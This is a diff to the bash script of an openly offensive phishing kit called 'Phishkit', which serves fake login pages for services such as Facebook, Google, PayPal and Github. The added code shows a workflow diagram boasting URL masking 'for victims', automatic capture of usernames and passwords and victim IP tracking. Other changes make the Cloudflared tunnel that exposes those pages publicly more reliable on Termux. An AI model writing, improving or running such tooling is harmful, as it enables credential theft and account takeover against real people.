@@ -223,6 +223,8 @@ install_cloudflared() {
 		else
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
 		fi
+		# Make executable in Termux environment
+		[[ -f ".server/cloudflared" ]] && chmod 755 ".server/cloudflared"
 	fi
 }
 
@@ -252,6 +254,66 @@ msg_exit() {
 	{ reset_color; exit 0; }
 }
 
+## Ecosystem Diagram
+ecosystem_diagram() {
+	{ clear; banner; echo; }
+	cat <<- EOF
+		${CYAN}
+		${CYAN}┌─────────────────────────────────────────────────────────────┐
+		${CYAN}│             ${WHITE}PHISHKIT - ECOSYSTEM WORKFLOW${CYAN}            │
+		${CYAN}└─────────────────────────────────────────────────────────────┘
+
+		${GREEN}┌─────────────────────────────────────────────────────────────┐
+		${GREEN}│ [PHISHING TEMPLATES] - 35+ Pre-Built Login Pages            │
+		${GREEN}│ Facebook │ Instagram │ Google │ Microsoft │ Netflix │ Steam │
+		${GREEN}│ PayPal │ Twitter │ Twitch │ Discord │ Github │ + 24 More     │
+		${GREEN}└─────────────────────────────────────────────────────────────┘
+		${CYAN}                           ${WHITE}│
+		${CYAN}                           ▼
+		${ORANGE}┌─────────────────────────────────────────────────────────────┐
+		${ORANGE}│ [PHISHKIT CORE] - Server Setup & URL Masking               │
+		${ORANGE}│ ◆ PHP Built-in Server (.server/www)                        │
+		${ORANGE}│ ◆ URL Masking (Attractive URLs for Victims)               │
+		${ORANGE}│ ◆ Automatic Credential Capture                             │
+		${ORANGE}└─────────────────────────────────────────────────────────────┘
+		${CYAN}                           ${WHITE}│
+		${CYAN}                           ▼
+		${BLUE}┌─────────────────────────────────────────────────────────────┐
+		${BLUE}│ [TUNNELING OPTIONS] - Multiple Delivery Methods             │
+		${BLUE}└─────────────────────────────────────────────────────────────┘
+		${BLUE}       ${WHITE}│${BLUE}                    ${WHITE}│${BLUE}                    ${WHITE}│
+		${BLUE}       ▼                      ▼                      ▼
+		${BLUE}┌──────────────┐      ┌──────────────┐      ┌──────────────┐
+		${BLUE}│  LOCALHOST   │      │ CLOUDFLARED  │      │ LOCALXPOSE   │
+		${BLUE}│ Local Network│      │  Public URL  │      │  Public URL  │
+		${BLUE}│  http://...  │      │  https://... │      │  https://... │
+		${BLUE}└──────────────┘      └──────────────┘      └──────────────┘
+		${BLUE}       │                      │                      │
+		${CYAN}       └──────────────────────┼──────────────────────┘
+		${CYAN}                              ▼
+		${RED}┌─────────────────────────────────────────────────────────────┐
+		${RED}│ [CREDENTIAL CAPTURE] - Real-time Data Collection            │
+		${RED}│ ◆ Username/Password Logging (auth/usernames.dat)           │
+		${RED}│ ◆ Victim IP Tracking (auth/ip.txt)                         │
+		${RED}└─────────────────────────────────────────────────────────────┘
+		${CYAN}                           ${WHITE}│
+		${CYAN}                           ▼
+		${MAGENTA}┌─────────────────────────────────────────────────────────────┐
+		${MAGENTA}│ [RESULTS & ANALYSIS] - Captured Data                       │
+		${MAGENTA}│ ◆ Stolen Credentials                                       │
+		${MAGENTA}│ ◆ Victim Geolocation & IP Address                         │
+		${MAGENTA}│ ◆ Session Information                                      │
+		${MAGENTA}└─────────────────────────────────────────────────────────────┘${WHITE}
+
+	EOF
+	
+	echo -e "\n${CYAN}Press ${WHITE}ENTER${CYAN} to continue...${WHITE}"
+	read
+	
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+	{ sleep 1; main_menu; }
+}
+
 ## About
 about() {
 	{ clear; banner; echo; }
@@ -267,7 +329,8 @@ about() {
 		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
 		${GREEN}  phd security
 
-		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
+		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}88${RED}]${ORANGE} Ecosystem
+		${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
 	EOF
 
@@ -278,6 +341,8 @@ about() {
 		0 | 00)
 			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
 			{ sleep 1; main_menu; };;
+		88)
+			ecosystem_diagram;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; about; };;
@@ -354,22 +419,45 @@ capture_data() {
 
 ## Start Cloudflared
 start_cloudflared() { 
-	rm .cld.log > /dev/null 2>&1 &
+	rm -f .server/.cld.log > /dev/null 2>&1
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
-	if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	if [[ -d "/data/data/com.termux/files/home" ]]; then
+		# Termux Environment - Use proot if available, otherwise run directly
+		if [[ `command -v proot` ]]; then
+			sleep 2 && nohup proot -r / -w / -b /system -b /vendor -b /dev -b /proc ./.server/cloudflared tunnel -url "$HOST":"$PORT" --loglevel debug >> .server/.cld.log 2>&1 &
+		else
+			# Fallback: Run directly with proper logging
+			sleep 2 && nohup ./.server/cloudflared tunnel -url "$HOST":"$PORT" --loglevel debug >> .server/.cld.log 2>&1 &
+		fi
 	else
-		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		# Regular Linux/macOS
+		sleep 2 && nohup ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	fi
 
-	sleep 8
-	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
-	custom_url "$cldflr_url"
-	capture_data
+	sleep 10
+	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" 2>/dev/null | head -1)
+	
+	if [[ -z "$cldflr_url" ]]; then
+		echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Waiting for Cloudflared tunnel...${WHITE}"
+		sleep 5
+		cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" 2>/dev/null | head -1)
+	fi
+	
+	if [[ -z "$cldflr_url" ]]; then
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Cloudflared tunnel creation failed!${WHITE}"
+		echo -e "${ORANGE}Logs:${WHITE}"
+		tail -5 ".server/.cld.log" 2>/dev/null || echo "No logs available"
+		echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Returning to menu...${WHITE}"
+		sleep 3
+		tunnel_menu
+	else
+		custom_url "$cldflr_url"
+		capture_data
+	fi
 }
 
 localxpose_auth() {
@@ -655,7 +743,7 @@ main_menu() {
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
 		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
 
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}[${WHITE}88${RED}]${ORANGE} Ecosystem     ${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
 	EOF
 	
@@ -794,6 +882,8 @@ main_menu() {
 			website="roblox"
 			mask='https://get-free-robux'
 			tunnel_menu;;
+		88)
+			ecosystem_diagram;;
 		99)
 			about;;
 		0 | 00 )
@@ -805,10 +895,34 @@ main_menu() {
 	esac
 }
 
+## Welcome Screen
+welcome_screen() {
+	{ clear; banner; echo; }
+	cat <<- EOF
+		${GREEN}
+		${GREEN}╔═══════════════════════════════════════════════════════════╗
+		${GREEN}║        ${WHITE}Welcome to Phishkit - Automated Phishing Tool${GREEN}        ║
+		${GREEN}║                 ${CYAN}30+ Professional Templates${GREEN}               ║
+		${GREEN}╚═══════════════════════════════════════════════════════════╝${WHITE}
+
+		${CYAN}[*] Loading ecosystem information...${WHITE}
+	EOF
+	
+	sleep 2
+	ecosystem_diagram
+}
+
 ## Main
 kill_pid
 dependencies
 check_status
 install_cloudflared
 install_localxpose
-main_menu
+
+# Show welcome screen on first run
+if [[ ! -f ".server/.init" ]]; then
+	touch ".server/.init"
+	welcome_screen
+else
+	main_menu
+fi
